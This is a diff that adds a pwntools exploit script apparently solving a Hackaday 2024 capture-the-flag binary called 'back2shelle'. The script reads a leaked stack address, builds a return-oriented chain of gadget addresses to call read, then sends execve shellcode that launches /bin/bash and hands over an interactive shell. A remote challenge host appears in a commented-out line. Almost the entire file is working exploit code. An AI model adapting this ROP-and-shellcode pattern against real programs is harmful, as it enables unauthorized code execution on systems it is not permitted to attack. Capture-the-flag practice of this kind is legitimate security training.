@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./back2shelle")
+# context.log_level='debug'
+# p = remote("hackaday2024-53-pwn-challenge-f9dbdd7879849e5c.elb.us-west-2.amazonaws.com", 9999)
+p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+
+
+p.recvuntil("me to my challenge!")
+p.recvline()
+addr = int(p.recv(14),16)
+log.info(f"{hex(addr) = }")
+pop_rdi = 0x00000000004020c8
+leave_ret = 0x000000000040183c
+pop_rsi = 0x000000000040309e
+pop_rdx_rbx = 0x000000000045f597
+syscall = 0x000000000041d30b
+shellcode = asm(f"""
+                mov rax, 0x3b
+                mov rdi,{addr+38}
+                xor rsi,rsi
+                xor rdx,rdx
+                syscall
+
+                """,arch="amd64")
+
+# gdbs()
+sl(b"/bin/bash\0".ljust(10)+p64(addr-8)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(addr+64-8)+p64(exe.sym.read))
+input()
+sl(shellcode.ljust(40,b"\0")+p64(addr+64-8))
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
